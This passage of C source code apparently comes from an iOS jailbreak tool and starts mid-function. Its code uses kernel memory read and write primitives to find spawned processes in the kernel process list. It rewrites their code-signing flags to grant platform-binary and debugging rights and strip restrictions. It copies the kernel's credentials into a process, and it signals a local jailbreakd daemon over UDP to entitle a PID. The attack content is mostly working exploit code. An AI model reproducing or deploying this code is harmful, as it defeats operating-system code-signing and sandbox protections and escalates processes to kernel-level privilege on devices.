    int tries = 3;
    while (tries-- > 0) {
        sleep(1);
        uint64_t proc = rk64(find_allproc());
        while (proc) {
            uint32_t pid = rk32(proc + offsetof_p_pid);
            if (pid == pd) {
                uint32_t csflags = rk32(proc + offsetof_p_csflags);
                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                wk32(proc + offsetof_p_csflags, csflags);
                printf("empower PID %d\n", pid);
                tries = 0;
                break;
            }
            proc = rk64(proc);
        }
    }
    return 0;
}

int startprog(uint64_t kern_ucred, bool wait, const char *prog, const char* args[], const char* envp[]) {
    pid_t pd;
    int rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, envp);
    printf("spawn '%s': pid=%d\n", prog, pd);
    printf("rv=%d\n", rv);

    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            uint64_t proc = rk64(find_allproc());
            while (proc) {
                uint32_t pid = rk32(proc + offsetof_p_pid);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + offsetof_p_csflags);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + offsetof_p_csflags, csflags);
                    printf("empower\n");
                    tries = 0;
                    uint64_t self_ucred = 0;
                    kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));

                    kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }

    if (wait)
        waitpid(pd, NULL, 0);
    return rv;
}


#include <netinet/in.h>
#include <netdb.h>

#define JAILBREAKD_COMMAND_ENTITLE_AND_SIGCONT_AFTER_DELAY 4
struct __attribute__((__packed__)) JAILBREAKD_ENTITLE_PID_AND_SIGCONT {
    uint8_t Command;
    int32_t PID;
};

void calljailbreakd(pid_t PID){
#define BUFSIZE 1024

    int sockfd, portno, n;
    int serverlen;
    struct sockaddr_in serveraddr;
    struct hostent *server;
    char *hostname;
    char buf[BUFSIZE];

    hostname = "127.0.0.1";
    portno = 5;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        printf("ERROR opening socket\n");

    /* gethostbyname: get the server's DNS entry */
    server = gethostbyname(hostname);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host as %s\n", hostname);
        exit(0);
    }

    /* build the server's Internet address */
    bzero((char *) &serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    bcopy((char *)server->h_addr,
          (char *)&serveraddr.sin_addr.s_addr, server->h_length);
    serveraddr.sin_port = htons(portno);

    /* get a message from the user */
    bzero(buf, BUFSIZE);

    struct JAILBREAKD_ENTITLE_PID_AND_SIGCONT entitlePacket;
    entitlePacket.Command = JAILBREAKD_COMMAND_ENTITLE_AND_SIGCONT_AFTER_DELAY;
    entitlePacket.PID = PID;

    memcpy(buf, &entitlePacket, sizeof(struct JAILBREAKD_ENTITLE_PID_AND_SIGCONT));

    serverlen = sizeof(serveraddr);
    n = sendto(sockfd, buf, sizeof(struct JAILBREAKD_ENTITLE_PID_AND_SIGCONT), 0, (const struct sockaddr *)&serveraddr, serverlen);
    if (n < 0)
        printf("Error in sendto\n");
}
